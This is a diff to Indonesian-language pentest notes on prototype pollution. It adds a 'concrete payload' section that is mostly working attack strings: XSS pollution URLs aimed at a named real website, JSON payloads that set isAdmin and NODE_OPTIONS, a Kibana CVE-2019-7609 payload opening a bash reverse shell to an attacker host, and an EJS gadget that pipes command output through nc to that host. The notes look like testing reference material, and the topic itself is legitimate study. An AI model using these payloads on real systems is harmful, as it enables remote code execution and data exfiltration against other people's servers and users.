@@ -274,7 +274,7 @@ function safeMerge(target, source) {
 
 ## 8. Referensi
 
-- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Prototype Pollution/`
+- PayloadsAllTheThings Prototype Pollution — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
 - OWASP: Prototype Pollution Prevention Cheat Sheet
 
 **Cross-link vault:**
@@ -282,73 +282,83 @@ function safeMerge(target, source) {
 - [[api-security-deep-dive]] — API security
 - [[browser-security-exploitation-deepdive]] — browser attack
 - [[web-hacking-exploitation]] — teknik exploit
-- [[vault:01_Library/Cyber_Security/Web_Security/]] — security references
+- [[.md]] — security references
 
-## Deepdive Tambahan — Implementasi & Operasional
+## 9. Payload Konkret — Prototype Pollution (Testable)
 
-### Arsitektur & Komponen Detail
+### Manual Testing (Client)
 
-Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.
+```html
+<!-- Detect via query string URL + __proto__ -->
+https://victim.com/#a=b&__proto__[admin]=1
+https://example.com/#__proto__[xxx]=alert(1)
 
-| Komponen | Fungsi | Attack Surface | Defense |
-|----------|--------|---------------|---------|
-| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
-| **Processing** | Core logic | Logic flaw, bypass | Test, review |
-| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
-| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
-| **Network** | Transit | Intercept, MITM | TLS, mTLS |
-| **Identity** | Access control | Token theft, privesc | MFA, least privilege |
-
-### Workflow End-to-End
-
-```
-Input → Validate → Process → Store → Serve → Monitor → Audit
-  ↓       ↓         ↓         ↓       ↓        ↓        ↓
-Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
+<!-- apple.com real-case (XSS) -->
+https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
+https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
 ```
 
-### Tradeoff & Decision Matrix
+### Server-Side Detection
 
-| Dimension | Pilihan A | Pilihan B | Factor |
-|-----------|-----------|-----------|--------|
-| Speed vs Security | Optimized | Strict validate | Risk context |
-| Memory vs Scale | In-memory | Disk-backed | Data volume |
-| Cost vs Control | Cloud managed | Self-hosted | Team capability |
-| Convenience vs Audit | Auto | Manual review | Compliance |
+```json
+// Pollute (cek respon: object menjadi "valid")
+{
+  "__proto__": { "isAdmin": true }
+}
+// Gagal jika di filter, berhasil jika object inherit
 
-### Best Practice Checklist
+// Via constructor
+{
+  "constructor": { "prototype": { "foo": "bar" } }
+}
 
-- [ ] Input validation (whitelist, not blacklist)
-- [ ] Output encoding (context-aware: HTML, JS, CSS)
-- [ ] Authentication (MFA, rate limit, lockout)
-- [ ] Authorization (RBAC, least privilege, deny default)
-- [ ] Logging (structured, immutable, centralized)
-- [ ] Monitoring (latency, error, saturation, traffic)
-- [ ] Encryption (transit TLS, rest AES, key rotation)
-- [ ] Backup (test restore, offsite, immutable)
-- [ ] Patch (automated scan, SLA per severity)
-- [ ] Incident (runbook, contact, tabletop)
+// Node.js env pollution (RCE via NODE_OPTIONS)
+{
+  "__proto__": {
+    "env": { "NODE_OPTIONS": "--inspect=attacker.com" }
+  }
+}
+```
 
-### Common Pitfall
+### RCE via Kibana (CVE-2019-7609)
 
-1. **Assume input trusted**: Semua input adalah musuh → validate di server.
-2. **Secret in code**: Hardcoded credential → git leak → compromise.
-3. **Silent failure**: Error ditelan → debugging impossible → security blind.
-4. **No rate limit**: Abuse path → DoS → resource exhaustion.
-5. **Default config**: Default = insecure → harden sebelum produksi.
+```js
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER/4444 0>&1");process.exit()//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+```
 
-### Tool Stack
+### RCE via EJS Gadgets
 
-| Tool | Use |
-|------|-----|
-| Testing | Burp Suite, OWASP ZAP, ffuf |
-| Scanning | Nmap, Nuclei, Trivy |
-| Monitoring | Prometheus + Grafana |
-| Logging | ELK / Loki |
-| Secret | Vault / SOPS |
+```json
+{
+  "__proto__": {
+    "client": 1,
+    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc ATTACKER 4444')"
+  }
+}
+```
 
-## Referensi
-- OWASP Top 10 — https://owasp.org/www-project-top-ten/
-- NIST CSF — https://www.nist.gov/cyberframework
-- MITRE ATT&CK — https://attack.mitre.org/
-- CIS Controls — https://www.cisecurity.org/controls/
+### Server-Side Tools
+
+```bash
+# Burp extension (deteksi SSPP otomatis)
+# PortSwigger server-side-prototype-pollution
+
+# pp-finder (cari gadget)
+python3 ppfinder.py -f jsfile.js
+
+# silent-spring (CSPP → RCE payload)
+```
+
+## 10. Test Checklist Prototype Pollution
+
+1. Cari endpoint yang merge objek: `Object.assign`, `_.merge`, `$.extend`, `JSON.parse + deep merge`
+2. Coba `__proto__`, `constructor.prototype`
+3. Cek respon: property baru muncul / behavior berubah?
+4. Client: URL fragment `#__proto__[x]=y` + cek sink `config`, `options`
+5. Server: inject `"__proto__": {"env": {...}}` → cek RCE via NODE_OPTIONS
+6. CVE terkenal: Kibana (CVE-2019-7609), EJS gadget, minimist (CVE-2021-44906)
+---
+
+audited
+---
